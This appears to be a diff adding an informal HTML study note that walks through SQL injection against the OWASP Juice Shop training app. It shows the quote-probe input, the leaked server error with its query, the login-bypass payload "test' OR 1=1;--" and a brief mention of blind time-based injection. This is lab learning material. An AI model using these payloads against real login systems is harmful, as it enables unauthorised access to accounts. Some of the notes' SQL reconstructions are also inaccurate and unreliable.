@@ -1,0 +1,97 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>7.SQL injection Walkthrough</title>
+</head><body>sudo docker run --rm -p 3000:3000 bkimminich/juice-shop <br/>
+for running juice shop<br/>
+<img src="image.png" /><br/>
+tried wth username:test<br/>
+password:test<br/>
+<img src="image 2.png" /><br/>
+<br/>
+-------------------------------------------------------------------<br/>
+Input : test<br/>
+(what happens in backend) SELECT * FROM Users where email='test';<br/>
+<br/>
+so if I do <br/>
+Input:test'<br/>
+"email":"test'","password":"test"<br/>
+(what happens in backend) SELECT * FROM Users where email='test'';<br/>
+which will throw an SQL error na<br/>
+<br/>
+so try that now <br/>
+<img src="image 3.png" /><br/>
+HTTP/1.1 500 Internal Server Error<br/>
+Access-Control-Allow-Origin: *<br/>
+X-Content-Type-Options: nosniff<br/>
+X-Frame-Options: SAMEORIGIN<br/>
+Feature-Policy: payment 'self'<br/>
+Content-Type: application/json; charset=utf-8<br/>
+Vary: Accept-Encoding<br/>
+Date: Fri, 02 Apr 2021 12:32:46 GMT<br/>
+Connection: close<br/>
+Content-Length: 1169<br/>
+<br/>
+{<br/>
+&nbsp; "error": {<br/>
+&nbsp; &nbsp; "message": "SQLITE_ERROR: unrecognized token: \"098f6bcd4621d373cade4e832627b4f6\"",<br/>
+&nbsp; &nbsp; "stack": "SequelizeDatabaseError: SQLITE_ERROR: unrecognized token: \"098f6bcd4621d373cade4e832627b4f6\"\n &nbsp; &nbsp;at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:415:16)\n &nbsp; &nbsp;at Query._handleQueryResponse (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:72:18)\n &nbsp; &nbsp;at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:246:27)\n &nbsp; &nbsp;at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:14:21)",<br/>
+&nbsp; &nbsp; "name": "SequelizeDatabaseError",<br/>
+&nbsp; &nbsp; "parent": {<br/>
+&nbsp; &nbsp; &nbsp; "errno": 1,<br/>
+&nbsp; &nbsp; &nbsp; "code": "SQLITE_ERROR",<br/>
+&nbsp; &nbsp; &nbsp; "sql": "SELECT * FROM Users WHERE email = 'test'' AND password = '098f6bcd4621d373cade4e832627b4f6' AND deletedAt IS NULL"<br/>
+&nbsp; &nbsp; },<br/>
+&nbsp; &nbsp; "original": {<br/>
+&nbsp; &nbsp; &nbsp; "errno": 1,<br/>
+&nbsp; &nbsp; &nbsp; "code": "SQLITE_ERROR",<br/>
+&nbsp; &nbsp; &nbsp; "sql": "SELECT * FROM Users WHERE email = 'test'' AND password = '098f6bcd4621d373cade4e832627b4f6' AND deletedAt IS NULL"<br/>
+&nbsp; &nbsp; },<br/>
+&nbsp; &nbsp; "sql": "SELECT * FROM Users WHERE email = 'test'' AND password = '098f6bcd4621d373cade4e832627b4f6' AND deletedAt IS NULL"<br/>
+&nbsp; }<br/>
+}<br/>
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+THUS WE GOT TO KNOW FOLLOWING THINGS<br/>
+Sqlite error means database is SQLITE <br/>
+<br/>
+&nbsp;"SELECT * FROM Users WHERE email = 'test'' AND password = '098f6bcd4621d373cade4e832627b4f6' AND deletedAt IS NULL"<br/>
+thus infer from this<br/>
+&nbsp;<br/>
+INput: test' OR 1=1;--<br/>
+SQL:SELECT * FROM Users WHERE email='test OR 1=1; --';<br/>
+as SQL statemtn ends after ';' so everything after it fdoesnt exist and hence this time it wont check for a password bhi <br/>
+<br/>
+this would gve us the first user that is the admin <br/>
+this pocess is called as comment SQL Injection<br/>
+&nbsp; <br/>
+<img src="image 4.png" width="877" height="250" /><br/>
+<br/>
+at times we l have SQL injection bt we wont be able to see it at all called as blind sql injection<br/>
+<br/>
+INput: test' &nbsp;(sleep 5)<br/>
+so what it does is after u press login it just sleeps the system for u for the req amt f seconds<br/>
+burp active scanner is very good at it<br/>
+<br/>
+<br/>
+SOLVE ALL INJECTION CHALLENGES<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
